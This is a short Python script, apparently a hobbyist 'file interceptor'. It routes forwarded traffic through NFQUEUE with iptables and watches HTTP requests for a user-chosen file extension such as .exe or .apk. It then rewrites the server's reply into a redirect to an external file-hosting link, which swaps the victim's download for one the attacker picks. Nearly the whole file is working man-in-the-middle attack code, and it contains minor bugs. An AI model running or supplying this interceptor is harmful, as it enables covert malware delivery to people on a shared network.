#!/usr/env python
import netfilterqueue 
import scapy.all as nitro
from scapy.all import Raw
import pyfiglet
import subprocess
import os

result = pyfiglet.figlet_format('404_is', font='slant')
print(result)

print("A file interceptor designed by obadare victor")

print("possible interceptable extentions .zip, .exe, .apk, ,.mp3")

input_type =  input("kindly specify your extention to intercept:")

subprocess.run(["sudo", "iptables", "-I", "FORWARD", "-j", "NFQUEUE"])

ack_list = []

def set_SCRIPT(packet, load):
    packet[nitro.Raw].load = load
    del packet[nitro.IP].len
    del packet[nitro.IP].chksum
    del packet[nitro.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = nitro.IP(packet.get_payload())
    if scapy_packet.haslayer(nitro.Raw):
        if scapy_packet[nitro.TCP].dport == 80:
            if input_type in scapy_packet[nitro.Raw].load:    
                print("[+] 404 has detected a {input_type} request")
                ack_list.append(scapy_packet[nitro.TCP].ack)
        elif scapy_packet[nitro.TCP].sport == 80:
            if scapy_packet[nitro.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[nitro.TCP].seq)
                print("[+] 404 is replacing file")
                edited_packet =  set_SCRIPT(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://ufile.io/3t1pmjhx\n\n" )
                packet.set_payload(str(edited_packet))


    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)

try: 
    queue.run()
except KeyboardInterrupt:
    os.system("iptables --flush")